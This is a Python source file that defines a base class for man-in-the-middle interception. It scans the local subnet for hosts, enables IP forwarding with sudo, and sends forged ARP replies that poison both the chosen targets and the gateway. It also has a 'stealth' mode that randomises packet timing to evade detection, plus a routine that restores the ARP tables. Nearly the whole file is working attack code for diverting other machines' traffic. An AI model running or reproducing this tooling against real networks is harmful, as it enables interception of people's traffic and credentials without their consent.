"""
BaseMITM — shared ARP spoof + network setup logic.
"""

import os
import sys
import time
import random
import subprocess
import threading
from typing import Optional, Dict

import click
from scapy.all import (
    ARP, Ether, srp, sendp,
)


class BaseMITM:
    """Shared ARP spoof + network setup logic for MITM interceptors."""

    def __init__(self, interface: str = "en0", log_dir: str = "./reports/mitm", stealth: bool = False):
        self.interface = interface
        self.log_dir = log_dir
        self.stealth = stealth
        self.running = False
        self.gateway_ip: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.our_ip: Optional[str] = None
        self.our_mac: Optional[str] = None
        self.targets: Dict[str, str] = {}  # ip -> mac
        self._poison_thread: Optional[threading.Thread] = None

        os.makedirs(log_dir, exist_ok=True)

    # ── Setup ──────────────────────────────────────────────

    def _detect_gateway(self) -> str:
        result = subprocess.run(["netstat", "-nr"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            parts = line.split()
            if parts and parts[0] == "default" and "." in (parts[1] if len(parts) > 1 else ""):
                return parts[1]
        raise RuntimeError("Cannot detect gateway IP")

    def _get_mac_from_arp_cache(self, ip: str) -> Optional[str]:
        """Get MAC address from system ARP cache (macOS/Linux)."""
        # Try arp -n first (numeric, faster)
        result = subprocess.run(["arp", "-n", ip], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            # macOS: ? (10.1.0.1) at ab:cd:ef:12:34:56 on en0
            # Linux: ? (10.1.0.1) at ab:cd:ef:12:34:56 [ether] on eth0
            if ip in line and "at" in line and "incomplete" not in line.lower():
                parts = line.split()
                if "at" in parts:
                    at_idx = parts.index("at")
                    if at_idx + 1 < len(parts):
                        mac = parts[at_idx + 1]
                        if ":" in mac or "-" in mac:
                            return mac
        # Fallback to arp -a
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if ip in line and (":" in line or "-" in line) and "incomplete" not in line.lower():
                parts = line.split()
                for part in parts:
                    if ":" in part or "-" in part:
                        return part
        return None

    def _discover_targets(self, network: Optional[str] = None) -> Dict[str, str]:
        if not network:
            octets = self.our_ip.split(".")
            network = f"{'.'.join(octets[:3])}.0/24"
        click.echo(f"  Scanning {network} ...")
        
        # Try ARP scan first (requires root)
        targets = {}
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
                timeout=5, iface=self.interface, verbose=0,
            )
            for _, rcv in ans:
                ip = rcv.psrc
                mac = rcv.hwsrc
                if ip != self.our_ip and ip != self.gateway_ip:
                    targets[ip] = mac
        except Exception as e:
            click.echo(f"  ARP scan failed: {e}")
        
        # Fallback: use system ARP table
        if not targets:
            click.echo("  Using ARP table fallback...")
            import subprocess
            result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
            network_prefix = network.replace(".0/24", ".")
            for line in result.stdout.splitlines():
                if network_prefix in line and "incomplete" not in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        ip = parts[1].strip("()") if "(" in parts[1] else parts[1]
                        mac = parts[3] if ":" in parts[3] else parts[2]
                        if ip != self.our_ip and ip != self.gateway_ip and ":" in mac:
                            targets[ip] = mac
        
        return targets

    def _enable_forwarding(self):
        if sys.platform == "darwin":
            cmd = ["sysctl", "-w", "net.inet.ip.forwarding=1"]
            if os.geteuid() != 0:
                cmd = ["sudo"] + cmd
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                click.echo(click.style(
                    f"  WARNING: Failed to enable IP forwarding: {result.stderr}", fg="yellow"))
            else:
                check = subprocess.run(
                    ["sysctl", "net.inet.ip.forwarding"], capture_output=True, text=True)
                click.echo(f"  IP forwarding: {check.stdout.strip()}")
        elif sys.platform.startswith("linux"):
            cmd = ["tee", "/proc/sys/net/ipv4/ip_forward"]
            if os.geteuid() != 0:
                cmd = ["sudo"] + cmd
            subprocess.run(cmd, input="1", capture_output=True, text=True)

    def _disable_forwarding(self):
        if sys.platform == "darwin":
            cmd = ["sysctl", "-w", "net.inet.ip.forwarding=0"]
            if os.geteuid() != 0:
                cmd = ["sudo"] + cmd
            subprocess.run(cmd, capture_output=True, text=True)
        elif sys.platform.startswith("linux"):
            cmd = ["tee", "/proc/sys/net/ipv4/ip_forward"]
            if os.geteuid() != 0:
                cmd = ["sudo"] + cmd
            subprocess.run(cmd, input="0", capture_output=True, text=True)

    # ── ARP Poisoning ─────────────────────────────────────

    def _send_poison_pair(self, target_ip: str, target_mac: str):
        """Send one ARP poison pair (target + gateway)."""
        sendp(
            Ether(dst=target_mac)
            / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                  psrc=self.gateway_ip, hwsrc=self.our_mac),
            iface=self.interface, verbose=0,
        )
        sendp(
            Ether(dst=self.gateway_mac)
            / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                  psrc=target_ip, hwsrc=self.our_mac),
            iface=self.interface, verbose=0,
        )

    def _poison_loop(self, interval: float = 2.0):
        while self.running:
            targets = list(self.targets.items())
            if self.stealth:
                random.shuffle(targets)
                batch_size = min(random.randint(1, 3), len(targets))
                for target_ip, target_mac in targets[:batch_size]:
                    self._send_poison_pair(target_ip, target_mac)
                    time.sleep(random.uniform(0.5, 2.0))
                time.sleep(random.uniform(5.0, 15.0))
            else:
                for target_ip, target_mac in targets:
                    self._send_poison_pair(target_ip, target_mac)
                time.sleep(interval)

    def _restore_arp(self):
        click.echo("\n  Restoring ARP tables ...")
        for _ in range(5):
            for target_ip, target_mac in list(self.targets.items()):
                sendp(
                    Ether(dst=target_mac)
                    / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                          psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                    iface=self.interface, verbose=0,
                )
                sendp(
                    Ether(dst=self.gateway_mac)
                    / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                          psrc=target_ip, hwsrc=target_mac),
                    iface=self.interface, verbose=0,
                )
            time.sleep(0.3)
